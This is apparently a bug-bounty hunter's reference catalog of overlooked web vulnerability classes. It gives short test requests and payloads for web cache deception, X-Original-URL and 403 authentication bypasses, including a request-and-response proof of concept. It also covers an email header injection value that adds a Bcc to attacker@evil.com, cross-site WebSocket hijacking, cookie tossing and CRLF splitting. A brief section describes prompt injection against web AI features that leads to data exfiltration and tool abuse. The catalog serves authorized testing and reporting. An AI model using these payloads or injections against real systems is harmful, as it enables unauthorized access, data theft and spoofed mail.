# Obscure & Overlooked Bug Catalog

Grab-bag of low-competition classes most hunters skip. Each = short test + why it pays.

## Web cache deception (private page cached as static)
Append a fake static suffix to an authenticated page; cache stores it; attacker fetches the cached copy.
```http
GET /account/settings/foo.css HTTP/1.1
Host: target.com
Cookie: session=<victim>
```
If it returns settings **and** `Cache-Control` lets the CDN store it → next requester (no cookie) gets victim data. Also `%0a.css`, `;.jpg`, `/%2F..%2f`. (deep dive: `10-server-edge/03`).

## HTTP request smuggling / desync
Front-end and back-end disagree on request length → poison next user. (see `08-infra/02`, `10-server-edge/02`). Highest-impact "unknown" class.

## Web LLM / AI-feature injection
Chatbots, summarizers, "AI" search: prompt injection → data exfil, tool abuse, SSRF via the model's fetch tool. Inject in any text the model ingests (profile, doc, filename). Growing, under-tested.

## Password reset token as second-order
Token stored, then leaked in a later admin/log view (see `01-second-order`).

## 0-auth GraphQL introspection → schema → hidden mutation
(see `07-api/02`). Introspection off? field-suggestion leaks names.

## Cookie bombing / cookie tossing
Set a huge or duplicate cookie on a sibling subdomain (`Domain=.target.com`) → DoS the victim (413) or override the security cookie (`__Host-` bypass, session fixation on parent).

## Cache key poisoning via unkeyed input
`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL` reflected but unkeyed → poison. (see `10-server-edge/03`).

## `X-Original-URL` / `X-Rewrite-URL` auth bypass
Some stacks (Symfony, IIS, Kong) route on these headers:
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin/users
```
Front-end sees `/`, app serves `/admin/users`.

## 401/403 bypass tricks
```
/admin        403
/admin/       200      /admin/.  /admin%2f  /Admin  /ADMIN  /admin..;/
/admin  + X-Forwarded-For: 127.0.0.1
/admin  + X-Custom-IP-Authorization: 127.0.0.1
/admin  + Referer: /admin
GET → POST/PUT/TRACE method swap
```

## Range / 416 / partial-response quirks
`Range: bytes=0-0` caching splits, `Range` bypassing WAF body inspection, request-range cache poisoning.

## Reset via unicode/case email dedupe (see `04-parser-differentials`)

## SMTP / email header injection
```
name=Foo%0d%0aBcc:attacker@evil.com
```
→ send mail as the app, exfil reset mails.

## Web socket hijacking (CSWSH) — full file: `05-client-side/07-websocket-security.md`
WS handshake with no origin check + cookie auth → attacker page opens WS, reads/sends as victim.
```
GET /ws HTTP/1.1
Upgrade: websocket
Origin: https://evil.com
Cookie: session=<victim, sent cross-site if no check>
```

## `.DS_Store` / `.git` / sourcemap dir mining (see `00-recon/03`, `08-infra/04`)

## Clickjacking on sensitive single-click actions (see `05-client-side/03`)

## Broken link hijacking / dangling assets
Dead social/CDN link referenced by the app → claim it → serve to their users.

## SVG / PDF / office-doc XXE & SSRF (see `03-injection/05`, `06-file-upload`)

## Numeric/precision/rounding abuse
`0.000001`, negative, integer overflow on money/quantity (see `02-business-logic/01`).

## 🎯 PoC — Request → Response (X-Original-URL auth bypass)

Front-end blocks `/admin`; the app routes on `X-Original-URL`:
```http
GET /admin HTTP/2
Host: target.com
```
```http
HTTP/2 403 Forbidden
```
```http
GET / HTTP/2
Host: target.com
X-Original-URL: /admin/users
```
```http
HTTP/2 200 OK
Content-Type: application/json

{"users":[{"id":"...","role":"admin"},...]}     ← proxy saw "/", app served /admin/users
```

**403 bypass by path mutation:**
```http
GET /admin/./ HTTP/2         →  HTTP/2 200 OK
GET /admin..;/ HTTP/2        →  HTTP/2 200 OK      (vs /admin = 403)
```

## More overlooked classes (2024–2025)
- **XS-Leaks (cross-site leaks):** infer victim state cross-origin via timing, frame counts, `error`/`load` events, cache probing, `COOP`/`CORP` gaps — full file: `09-advanced/11-xs-leaks.md`.
- **Client-Side Path Traversal (CSPT):** `../` in a client-built URL/fetch path pivots the request to another endpoint → CSRF/IDOR/token-leak — full file: `09-advanced/12-client-side-path-traversal.md`.
- **CRLF / response splitting:** `%0d%0a` into `Location`/reflected headers → `Set-Cookie`, cache poisoning, XSS (`03-injection/07`).
- **HTTP/2 Rapid Reset (CVE-2023-44487) & CONTINUATION flood:** stream-reset / header-frame floods = DoS — report-only, don't run on prod.
- **SMTP smuggling:** `\r\n.\r\n` desync between MTAs → send DMARC-passing spoofed mail from the target domain (`03-injection/07`).
- **PDF injection:** inject into a field rendered into a server-side PDF → SSRF/JS/annotation (`06-file-upload/03`).
- **ORM leak / GraphQL-ORM operators:** filter operators read unscoped rows (`03-injection/01`, `07-api/02`).
- **`Content-Disposition` filename tricks:** RTLO, CRLF, or path in the download filename → spoof/overwrite/second-order.
- **OAuth device-code phishing & PKCE downgrade** (`04-auth-session/04`).
- **Web LLM / prompt injection** (`11-ai-llm/01`).
- **Timing side-channels:** user-enum, token-compare, secret-length via response timing (`04-auth-session/01`).
- **`.well-known` misconfig:** `openid-configuration`/`assetlinks.json`/`apple-app-site-association` leaking endpoints & deep-link paths (`00-recon/03`).

## Report notes
For each: minimal proof, honest impact. Many are "info" alone but critical when chained — say which. New dedicated files exist for XS-Leaks and CSPT — use them for depth.
